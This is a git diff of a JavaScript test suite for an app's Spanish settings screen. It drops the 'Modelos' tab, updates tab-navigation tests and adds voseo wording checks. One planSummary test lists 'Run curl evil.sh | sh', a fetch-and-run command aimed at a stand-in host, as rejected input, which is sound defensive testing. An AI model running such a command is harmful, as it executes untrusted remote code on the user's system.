@@ -106,7 +106,7 @@ test('T6 mounts Coucou sidebar and page without replacing existing tab hosts', (
   const start = src.indexOf('  function mountSettingsFrame()');
   const end = src.indexOf('  // ---- settings frame end', start);
   assert.ok(start > 0 && end > start, 'shipped sidebar frame exists');
-  const nodes = new Map(['settings-tabs', 'settings-bar', 'settings-hint', 'settings-body', 'models'].map(id => [id, { id }]));
+  const nodes = new Map(['settings-tabs', 'settings-bar', 'settings-hint', 'settings-body'].map(id => [id, { id }]));
   const panel = { children: [], append(...items) { this.children.push(...items); } };
   const el = (tag, className, textContent) => ({ tag, className, textContent, children: [], append(...items) { this.children.push(...items); } });
   require('node:vm').runInNewContext(src.slice(start, end) + '\nmountSettingsFrame();', { panel, el, $: id => nodes.get(id) });
@@ -114,7 +114,7 @@ test('T6 mounts Coucou sidebar and page without replacing existing tab hosts', (
   const [side, page] = panel.children;
   assert.equal(side.children[0].textContent, 'Abito');
   assert.equal(side.children[1], nodes.get('settings-tabs'));
-  assert.deepEqual(page.children.map(n => n.id), ['settings-bar', 'settings-hint', 'settings-body', 'models']);
+  assert.deepEqual(page.children.map(n => n.id), ['settings-bar', 'settings-hint', 'settings-body']);
   const html = fs.readFileSync(path.join(frontend, 'index.html'), 'utf8');
   assert.match(html, /id="coucou-settings-style"[^>]*href="vendor\/coucou\/settings\/settings.css"[^>]*media="not all"/);
   assert.match(src, /\$\('coucou-settings-style'\)\.media = 'all'/);
@@ -221,23 +221,22 @@ test('T6 General keeps reduced motion and all theme choices; custom auto-close i
 });
 
 // ---- screens (copied from gentle-dot: one screen per header button, each covering the chat body) -------
-test('#442 T7.4 five sub-tabs of ONE Ajustes entry, design order (DESIGN-NOTES §3/§9): General, Conexiones, Modelos, Blobs, Apariencia — Especialistas is merged into Blobs', () => {
-  assert.deepEqual(S.TABS.map(x => x.id), ['general', 'accounts', 'models', 'pills', 'appearance']);
-  assert.deepEqual(S.TABS.map(x => x.title), ['General', 'Conexiones', 'Modelos', 'Blobs', 'Apariencia']);
+test('#442 T7.4 four sub-tabs of ONE Ajustes entry, design order (DESIGN-NOTES §3/§9): General, Conexiones, Blobs, Apariencia — Especialistas is merged into Blobs; K2-05 U5c (L72) removed Modelos', () => {
+  assert.deepEqual(S.TABS.map(x => x.id), ['general', 'accounts', 'pills', 'appearance']);
+  assert.deepEqual(S.TABS.map(x => x.title), ['General', 'Conexiones', 'Blobs', 'Apariencia']);
   // S8: the old ids still resolve (deep links), to the merged tab
   assert.equal(S.tabAlias('connectors'), 'accounts');
   assert.equal(S.tabAlias('accounts'), 'accounts');
-  assert.equal(S.tabAlias('models'), 'models');
+  // K2-05 U5c (L72): «Modelos» is gone from Ajustes, so its id is no alias any more
+  assert.equal(S.tabAlias('models'), null);
   // #442 T7.4: the Especialistas deep link resolves to the tab that absorbed it
   assert.equal(S.tabAlias('specialists'), 'pills');
   assert.equal(S.tabAlias('nope'), null);
-  // T7.2 design §3: one title + one hint line at most. Modelos keeps the design's own line; the
-  // other tabs draw none (the regenerated ajustes-ventana-* PNGs show no hint line). Was: every
-  // tab a multi-sentence hint (hint.length > 10).
+  // T7.2 design §3: one title + one hint line at most. T7.2 draws none (the regenerated ajustes-ventana-*
+  // PNGs show no hint line). Was: every tab a multi-sentence hint (hint.length > 10).
   for (const x of S.TABS) {
     assert.ok(x.icon, x.id);
-    if (x.id === 'models') assert.equal(x.hint, 'Modelos que usa Koda', x.id);
-    else assert.equal(x.hint, '', x.id);
+    assert.equal(x.hint, '', x.id);
   }
   assert.equal(S.tabById('connectors'), null, 'resolved through tabAlias, not a tab of its own');
   assert.equal(S.tabById('nope'), null);
@@ -246,10 +245,11 @@ test('#442 T7.4 five sub-tabs of ONE Ajustes entry, design order (DESIGN-NOTES �
 
 test('#408 tablist keyboard: arrows wrap, Home/End jump, other keys are ignored', () => {
   assert.equal(S.tabKeyTarget('general', 'ArrowRight'), 'accounts');
-  assert.equal(S.tabKeyTarget('accounts', 'ArrowRight'), 'models');
-  assert.equal(S.tabKeyTarget('models', 'ArrowRight'), 'pills');
+  assert.equal(S.tabKeyTarget('accounts', 'ArrowRight'), 'pills');
+  assert.equal(S.tabKeyTarget('pills', 'ArrowRight'), 'appearance');
   assert.equal(S.tabKeyTarget('appearance', 'ArrowRight'), 'general');
   assert.equal(S.tabKeyTarget('general', 'ArrowLeft'), 'appearance');
+  assert.equal(S.tabKeyTarget('pills', 'ArrowLeft'), 'accounts');
   assert.equal(S.tabKeyTarget('pills', 'Home'), 'general');
   assert.equal(S.tabKeyTarget('pills', 'End'), 'appearance');
   assert.equal(S.tabKeyTarget('pills', 'a'), null);
@@ -430,7 +430,7 @@ test('markup: gear + every icon-only control is named; sections are real tabs; t
   assert.match(html, /id="settings"[^>]*role="dialog"[^>]*aria-label="Ajustes"/);
   assert.match(html, /id="settings-tabs"[^>]*role="tablist"[^>]*aria-label="[^"]{3,}"/, '#408: a real tablist');
   for (const id of ['accounts', 'connectors']) assert.doesNotMatch(html, new RegExp(`id="open-screen-${id}"`), id + ' has no header button of its own');
-  assert.doesNotMatch(html, /id="chat-models"/, 'the Modelo header button moved into the Modelos tab');
+  assert.doesNotMatch(html, /id="chat-models"/, 'the Modelo header button moved into Ajustes (K2-05 U5c: the tab itself is gone)');
   const gear = /<button[^>]*id="open-screen-settings"[^>]*>/.exec(html);
   assert.ok(gear); assert.match(gear[0], /aria-label="Ajustes"/); assert.match(gear[0], /aria-expanded="false"/);
   assert.match(html, /<h2[^>]*id="settings-title"/, 'the screen title is a real heading');
@@ -909,6 +909,25 @@ test('copy: voseo everywhere (the human writes in Rioplatense Spanish)', () => {
   assert.doesNotMatch(all, /\b(Conecta|Pega|Inicia|Introduce|Elige|Haz|Pulsa|Escribe)\b(?= [a-zñáéíóú])/, 'no tú imperatives');
 });
 
+// S3 (04 ajustes 2): the hub pages are settings pages too, and they were a SECOND register («Haz clic», «Usa…») inside the SAME
+// window the chat speaks voseo in («Escribí…», «Soltá…»). One register, checked on the copy the hub renders.
+test('copy: the hub settings pages share the same voseo register (04 ajustes 2)', () => {
+  const src = f => fs.readFileSync(path.join(frontend, f), 'utf8');
+  const HUB = ['vendor/coucou/hub/i18n-es.js', 'vendor/coucou/hub/general.js', 'vendor/coucou/hub/accounts.js',
+    'vendor/coucou/hub/chat.js', 'settings-isla-mount.js', 'settings-app.js'];
+  // tú imperatives (also with an enclitic) and the tú present forms the copy used; «vos» writes those with an accent
+  const TU = /\b(Haz|Usa|Pulsa|Elige|Añade|Añádela|Quita|Dicta|Instala|Deja|Mantén|Pega|Descarga|Ejecuta|Vuelve)\b(?= [a-zñáéíóú])|\b(usas|haces|quieres|tienes|puedes|debes)\b/g;
+  const left = [];
+  for (const f of HUB) {
+    const text = src(f);
+    for (const m of text.matchAll(TU)) left.push(`${f}:${text.slice(0, m.index).split('\n').length} «${m[0]}»`);
+  }
+  assert.deepEqual(left, [], 'tú forms in the settings copy: write them in voseo (Hacé, Usá, Pulsá, Elegí…)');
+  // 04 ajustes 4: «de el personaje» -> «del personaje»
+  assert.doesNotMatch(src('vendor/coucou/hub/i18n-es.js'), /de el personaje/, 'the sounds text says «del personaje»');
+  assert.match(src('vendor/coucou/hub/i18n-es.js'), /sonidos del personaje/);
+});
+
 test('verbs follow gentle-dot: «Cerrar sesión» for an account (its Sign out), «Desconectar» for an agent (its Disconnect)', () => {
   const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
   assert.doesNotMatch(src, /wordBtn\('Salir'/, 'no «Salir» button');
@@ -1013,8 +1032,8 @@ test('Windows unavailable installer has an explicit state and help, never an act
 });
 
 test('plan: the sentence is OURS — an English template becomes Spanish, an unknown one is never shown as engine text', () => {
-  assert.equal(S.planSummary('Adds the Abito hooks (PermissionRequest, Stop) to ~/.codex/hooks.json. A backup is made first. Codex will ask you to trust them in /hooks.'),
-    'Agrega los hooks de Koda (PermissionRequest, Stop) a ~/.codex/hooks.json. Antes se hace un respaldo. Codex te va a pedir que confíes en ellos en /hooks.');
+  assert.equal(S.planSummary('Adds the Abito hooks (PermissionRequest, Stop) to ~/.codex/hooks.json. A backup is made first. Koda answers Codex permission requests from the island; Codex waits up to 120 s for your answer. Trust the Koda hooks again in Codex /hooks after every install or update.'),
+    'Agrega los hooks de Koda (PermissionRequest, Stop) a ~/.codex/hooks.json. Antes se hace un respaldo. Koda responde los permisos de Codex desde la isla; Codex espera hasta 120 s tu respuesta. Después de cada instalación o actualización, volvé a confiar en los hooks de Koda desde /hooks en Codex.');
   assert.equal(S.planSummary('Adds the Abito hooks (PermissionRequest, Stop) to ~/.claude/settings.json. A backup is made first. This change is large: review it in the file.'),
     'Agrega los hooks de Koda (PermissionRequest, Stop) a ~/.claude/settings.json. Antes se hace un respaldo. Es un cambio grande: revisalo en el archivo.');
   for (const odd of ['Run curl evil.sh | sh', '<b>x</b>', '', null, 7, 'Adds the Abito hooks to ' + 'x'.repeat(500)]) {
@@ -1229,100 +1248,6 @@ test('#380 theme wiring: one closed sender, no local paint, and a failed save ke
   assert.match(html, /<script defer src="theme\.js"><\/script>/);
 });
 
-// ---- #414: Ajustes → Modelos, grouped by CONNECTED provider ------------------------------
-test('#414 modelsTabView: one group per engine provider, connected ones with their models', () => {
-  const state = {
-    connection: 'connected',
-    providers: [
-      { id: 'anthropic', name: 'Anthropic', methods: ['oauth'], configured: true },
-      { id: 'openai', name: 'OpenAI', methods: ['oauth', 'api_key'], configured: false },
-      { id: 'nan', name: 'NaN', methods: ['api_key'], configured: false },
-    ],
-    accounts: [{ accountId: 'a1', provider: 'openai', configured: true }],
-    models: [
-      { provider: 'anthropic', id: 'claude-sonnet-4-5', name: 'Claude Sonnet 4.5', reasoning: true, contextWindow: 200000 },
-      { provider: 'anthropic', id: 'claude-opus-4-6', name: 'Claude Opus 4.6', reasoning: true, contextWindow: 200000 },
-      { provider: 'openai', id: 'gpt-5.2', name: 'GPT-5.2', reasoning: false, contextWindow: 128000 },
-      { provider: 'gone', id: 'x', name: 'X' }, // a model whose provider row disappeared is never shown
-    ],
-  };
-  const v = S.modelsTabView(state, { anthropic: ['claude-opus-4-6'] });
-  assert.equal(v.kind, 'ready');
-  assert.deepEqual(v.groups.map(g => [g.id, g.connected]), [['anthropic', true], ['openai', true], ['nan', false]], 'one group per provider, engine order');
-  const anthropic = v.groups[0];
-  assert.deepEqual(anthropic.models.map(m => [m.id, m.name, m.chosen]), [
-    ['claude-sonnet-4-5', 'Claude Sonnet 4.5', false],
-    ['claude-opus-4-6', 'Claude Opus 4.6', true],
-  ], 'the chosen one is marked, others not');
-  assert.equal(v.groups[1].models.length, 1, 'a connected provider via a configured account shows its models');
-  assert.equal(v.groups[1].models[0].id, 'gpt-5.2');
-  // disconnected: one-line hint, no models, never invented ones
-  const nan = v.groups[2];
-  assert.equal(nan.models, undefined);
-  assert.ok(nan.hint.includes('NaN') && nan.hint.includes('Conexiones'), nan.hint);
-  assert.ok(!JSON.stringify(v).includes('"x"'), 'a model of an unknown provider never leaks in');
-});
-
-test('T7.2 modelsTabView: «Guardado · sin probar» only where the provider\'s ONLY account is a locally saved key', () => {
-  const state = {
-    connection: 'connected',
-    providers: [
-      { id: 'anthropic', name: 'Anthropic', methods: ['api_key'], configured: false },
-      { id: 'openai', name: 'OpenAI', methods: ['oauth', 'api_key'], configured: true },
-      { id: 'both', name: 'Both', methods: ['api_key'], configured: false },
-    ],
-    accounts: [
-      { accountId: 'l1', provider: 'anthropic', local: true, configured: true },
-      { accountId: 'a1', provider: 'openai', configured: true },
-      { accountId: 'l2', provider: 'both', local: true, configured: true },
-      { accountId: 'a2', provider: 'both', configured: true },
-    ],
-    models: [
-      { provider: 'anthropic', id: 'c1', name: 'C1' }, { provider: 'openai', id: 'g1', name: 'G1' }, { provider: 'both', id: 'b1', name: 'B1' },
-    ],
-  };
-  const v = S.modelsTabView(state, {});
-  const by = id => v.groups.find(g => g.id === id);
-  assert.equal(by('anthropic').connected, true, 'a saved key lists its models');
-  assert.equal(by('anthropic').models[0].sub, 'Guardado · sin probar');
-  assert.equal(by('openai').models[0].sub, '', 'an engine account stays bare');
-  assert.equal(by('both').models[0].sub, '', 'a local key next to an engine account is not the ONLY account');
-});
-
-test('#414 modelsTabView: the chosen map arrives only from typed prefs and never marks unknown models', () => {
-  const state = { connection: 'connected', providers: [{ id: 'p', name: 'P', methods: ['api_key'], configured: true }], models: [{ provider: 'p', id: 'm1', name: 'M1' }] };
-  const v = S.modelsTabView(state, { p: ['other', 'm1'] });
-  assert.deepEqual(v.groups[0].models.map(m => m.chosen), [true]);
-  assert.equal(S.modelsTabView(state, null).groups[0].models[0].chosen, false, 'no prefs yet = nothing chosen');
-  assert.equal(S.modelsTabView(state, 'junk').groups[0].models[0].chosen, false, 'a hostile stored value reads as nothing chosen');
-});
-
-test('#414 modelsTabView: no engine or no models yet is honest', () => {
-  for (const connection of ['no_daemon', 'lost', 'refused', 'bad_session']) {
-    const v = S.modelsTabView({ connection }, {});
-    assert.equal(v.kind, 'no_engine', connection);
-    assert.ok(v.word && v.icon, connection);
-  }
-  const waiting = S.modelsTabView(null, {});
-  assert.equal(waiting.kind, 'connecting');
-  // connected, but the engine has not answered models_list yet: groups render, models empty
-  const v = S.modelsTabView({ connection: 'connected', providers: [{ id: 'p', name: 'P', methods: ['oauth'], configured: true }] }, {});
-  assert.equal(v.kind, 'ready');
-  assert.deepEqual(v.groups[0].models, []);
-});
-
-test('#414 chosenToggle: one toggle returns the next map; the payload the page sends carries the whole list', () => {
-  const next = S.chosenToggle({ anthropic: ['a1'] }, 'anthropic', 'a2');
-  assert.deepEqual(next.anthropic, ['a1', 'a2']);
-  assert.deepEqual(S.chosenToggle(next, 'anthropic', 'a1').anthropic, ['a2'], 'a second click removes it');
-  const fresh = S.chosenToggle({}, 'openai', 'gpt-5.2');
-  assert.deepEqual(fresh.openai, ['gpt-5.2']);
-  assert.ok(!Object.hasOwn(S.chosenToggle({ anthropic: ['a1'] }, 'anthropic', 'a1'), 'anthropic'), 'clearing the last model of a provider drops its key');
-  // the wire payload: exactly the closed action, provider and its whole list
-  const payload = S.chosenModelsPayload({ anthropic: ['a1', 'a2'] }, 'anthropic');
-  assert.deepEqual(payload, { action: 'set_chosen_models', provider: 'anthropic', models: ['a1', 'a2'] });
-  assert.deepEqual(S.chosenModelsPayload({}, 'anthropic').models, [], 'a cleared provider sends the empty list');
-});
 
 // #467 UI wiring: Claves section (secret_action). Presence only, closed key list, our own words for errors.
 test('claves: rows follow the closed key list, with OUR labels and presence only', () => {
@@ -1362,7 +1287,7 @@ console.log(`settings-view-check: ${passed} passed`);
 
 test('#408 rail: vertical tablist at the Settings size (Up/Down), wrapping row only as the 400 column fallback', () => {
   assert.equal(S.tabKeyTarget('pills', 'ArrowDown'), 'appearance');
-  assert.equal(S.tabKeyTarget('pills', 'ArrowUp'), 'models');
+  assert.equal(S.tabKeyTarget('pills', 'ArrowUp'), 'accounts');
   const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
   assert.match(src, /setAttribute\('aria-orientation', wide \? 'vertical' : 'horizontal'\)/);
   const css = fs.readFileSync(path.join(frontend, 'style.css'), 'utf8');
@@ -1532,7 +1457,6 @@ test('T7.2 controls: theme thumbnails and service actions keep a 44px hit area; 
   assert.match(rule('.int-actions button'), /min-width: 44px/);
   assert.match(rule('.int-actions button::after'), /inset: 6px/, 'service buttons: 44px element, 32px visual');
   assert.match(rule('.switch'), /height: 44px/);
-  assert.match(rule('.models-prov-model'), /min-height: 44px/);
 });
 
 // ---- #390 GD027: the manual restart of the island agent daemon (Ajustes → Conexiones) --------
@@ -1827,8 +1751,5 @@ test('K2-05 boot order: a connected daemon whose engine starts or restarts reads
   for (const engine of ['ready', 'stopped', null, undefined, 'nope']) assert.equal(S.connectionView({ connection: 'connected', engine }), null, String(engine));
   assert.equal(S.connectionView({ connection: 'no_daemon' }).word, 'Sin motor', 'a REAL no_daemon still says so');
   assert.equal(S.connectionView({ connection: 'no_daemon', engine: 'starting' }).word, 'Sin motor', 'only a connected daemon can report its engine');
-  // the models tab keeps working while the engine starts (accounts and models are the daemon's own)
-  const models = S.modelsTabView({ connection: 'connected', engine: 'starting', providers: [], models: [] }, {});
-  assert.notEqual(models.kind, 'no_engine');
 });
 console.log(`settings-view-check (K2-05 boot order): ${passed} passed`);
